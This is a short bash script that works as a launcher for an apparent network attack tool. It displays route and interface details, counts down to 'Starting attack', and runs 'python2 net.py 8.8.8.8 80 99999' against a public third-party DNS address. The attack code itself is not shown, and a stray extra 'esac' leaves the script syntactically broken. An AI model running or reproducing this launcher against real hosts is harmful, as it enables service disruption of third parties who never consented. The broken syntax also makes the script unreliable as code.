

read -p "start gui? [y/n]" var;
case $var in

n)
clear
tput setaf 2
echo "===========+[IP ROUTE INFO]+============"
ip route list
echo "========================================"
read -t 2
clear
echo "=============+[Interface]+=============="
iwconfig
read -t 2 
clear
echo "==============+[IP addr]+==============="
ifconfig
read -t 3
clear

tput setaf 33

echo -ne "Starting attack in [5]\r"
sleep 1

tput setaf 33
echo -ne "Starting attack in [4]\r"
sleep 1

tput setaf 22
echo -ne "Starting attack in [3]\r"
sleep 1

tput setaf 1
echo -ne "Starting attack in [2]\r"
sleep 1

echo -ne "Starting attack in [1]\r"
sleep 1




tput setaf 2
echo "Attacking..."


python2 net.py 8.8.8.8 80 99999

;;

y)

dialog --prgbox "visnet-interface" "iwconfig && sleep 2" 29 70
dialog --prgbox "visnet-statistics" "ifconfig && sleep 2" 80 80
dialog --prgbox "visnet-ip-route" "ip route list && sleep 2" 80 80
dialog --prgbox "visnet" "echo Press OK button to start attack && sleep 1" 15 80



python2 net.py 8.8.8.8 80 99999

;;

esac
esac




